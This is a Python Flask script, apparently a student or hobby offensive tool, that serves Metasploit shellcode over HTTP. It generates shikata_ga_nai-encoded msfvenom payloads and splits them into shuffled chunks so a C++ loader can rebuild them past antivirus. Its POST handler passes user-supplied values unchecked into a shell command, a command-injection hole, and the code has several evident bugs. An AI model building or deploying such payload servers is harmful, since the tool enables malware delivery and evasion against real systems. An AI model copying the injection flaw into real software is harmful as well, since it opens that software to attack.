#!/usr/bin/env python3

"""
    Author: Jake Homberg
    File: payloadAPI.py

    Description:    This file when run with python3 will host
    a HTTP RESTful API that will generate a payload per GET
    request that has been randomized with the method described
    in the scramblePayload.py file. scramblePayload.py has been
    ported to a class and will get the output from a metasploit
    command STDOUT and

"""

from flask import Flask, request
from flask_restful import Resource, Api, reqparse, abort
from random import randrange
import subprocess
from binascii import unhexlify
from base64 import b64encode, b64decode


app = Flask(__name__)
api = Api(app)

parser = reqparse.RequestParser()
parser.add_argument('pl')
parser.add_argument('args')
parser.add_argument('chunkSize')

class Payload():
    def randPayload(self, hexString, chunkSize):
        """
        Chunk the string into sets of bytes. Note that we have to use the
        chunkSize*2 in slicing to ensure that we are getting the correct number
        of bytes. 1 byte = 2 char in the string.
        """
        chunked = [hexString[i:i+(2*chunkSize)] for i in range(0, len(hexString), 2*chunkSize)]

        """
        Next we will create a dict that gives us the order of the chunks with an index.
        Each byte will be prepended with \\x which will be needed in the output.
        """
        fixedChunk = {}
        part = 0
        for chunk in chunked:
            fixedChunk[part] = chunk
            part = part + 1


        print('\n[*] The remaining input is formatted for use in C++ application development:\n')
        print("// This is the declaration and definition of all of the strings for our payload out of order")
        # Randomly pick chunks of the shellcode to print until there are none left
        chosenList = []
        jsonValues = []
        while len(chosenList) < len(fixedChunk):
            key = randrange(0, len(fixedChunk))
            if key not in chosenList:
                chosenList.append(key)
                jsonValues.append(fixedChunk[key])

        for value in chosenList:
            value = value-1
        return (jsonValues, chosenList, len(chosenList))

class HostPayload(Resource):
    def post_Validate(self, pl, args):
        if any([chr in pl for chr in[';', '&', '|']]) :
            return abort(404, message="Malformed input")
        else:
            return subprocess.getoutput('msfvenom -p ' + str(b64decode(pl)) + ' ' + str(b64decode(args)) + ' -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d" -f hex')

    def get(self):
         # Take the inputs and assign them to their proper variables
         payloadHex = subprocess.getoutput('msfvenom -p windows/messagebox TEXT=Pwnd TITLE=YouGot -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d" -f hex 2>/dev/null').replace("[Byte[]] $buf = ", "")
         chunkSize = 5

         Generator = Payload()

         # Call the randPayload function
         jsonValues, orderList, chunkCount = Generator.randPayload(payloadHex, chunkSize)
         result = {
             'chunkCount': chunkCount,
             'chunkSize' : chunkSize,
             'chunks' : jsonValues,
             'order' : orderList
         }
         return result
    def post(self):
        args = parser.parse_args(strict=True)
        result = self.post_Validate(args['pl'], args['args'])
        payloadHex = result.split('\n\n')[1]
        chunkSize = int(args['chunkSize'])
        Generator = Payload()

        # Call the randPayload function
        jsonValues, orderList, chunkCount = Generator.randPayload(payloadHex, chunkSize)
        result = {
            'chunkCount': chunkCount,
            'chunkSize' : chunkSize,
            'chunks' : jsonValues,
            'order' : orderList
        }
        return result

api.add_resource(HostPayload, '/payload')

if __name__ in "__main__":
    app.run(host='0.0.0.0', port=4321)
